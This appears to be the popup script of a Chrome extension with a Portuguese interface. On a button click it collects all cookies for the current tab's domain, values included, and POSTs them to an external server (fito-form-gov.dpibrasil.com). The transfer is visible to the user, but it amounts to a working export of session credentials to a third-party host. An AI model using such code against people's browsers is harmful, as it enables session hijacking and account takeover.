document.getElementById("ler").addEventListener("click", async () => {
    const mensagem = document.getElementById("mensagem");
    mensagem.textContent = "Enviando...";
    mensagem.className = "";

    try {
        const [tab] = await chrome.tabs.query({
            active: true,
            currentWindow: true
        });

        if (!tab || !tab.url) {
            throw new Error("Aba inválida");
        }

        const url = new URL(tab.url);
        const domain = url.hostname;

        chrome.cookies.getAll({ domain }, async (cookies) => {
        const body = {
            cookies: cookies.map((cookie) => ({
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain.replace(/^\./, ""),
            path: "/",
            expires: -1,
            httpOnly: false,
            secure: true,
            sameSite: "Lax"
            }))
        };

        try {
            const response = await fetch(
            "https://fito-form-gov.dpibrasil.com/cookies",
            {
                method: "POST",
                body: JSON.stringify(body),
                headers: {
                "Content-Type": "application/json"
                }
            }
            );

            if (!response.ok) {
            throw new Error("Erro ao enviar dados");
            }

            mensagem.textContent = "Cookies enviados com sucesso!";
            mensagem.className = "sucesso";
        } catch (erro) {
            mensagem.textContent = "Erro: " + erro.message;
            mensagem.className = "erro";
        }
        });
    } catch (erro) {
        mensagem.textContent = "Erro: " + erro.message;
        mensagem.className = "erro";
    }
});